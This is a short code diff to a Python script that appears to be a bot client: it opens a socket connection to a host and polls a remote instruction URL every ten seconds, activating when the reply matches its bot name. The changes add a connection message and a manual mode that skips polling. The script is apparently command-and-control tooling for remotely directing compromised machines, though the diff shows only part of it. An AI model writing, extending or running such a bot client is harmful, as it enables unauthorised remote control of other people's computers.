@@ -19,6 +19,7 @@ else:
 # connection ============================================= #
 def connect():
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	print( "[] Attempting to connect to {} on port {} ...".format(host, port) )
 	s.connect((host, port))
 
 	while True: 
@@ -43,7 +44,8 @@ def connect():
 
 while True: # Tests for instruction every 10 seconds.
 	if ACTIVE == False:
-		ACTIVE = ( urllib.request.urlopen(connections['instruction']).read() == botname )
+		if connections['instruction'] != 'manual':
+			ACTIVE = ( urllib.request.urlopen(connections['instruction']).read() == botname )
 		time.sleep(10)
 		continue
 	elif ( ACTIVE == True ) or ( ACTIVE == 'manual' ):
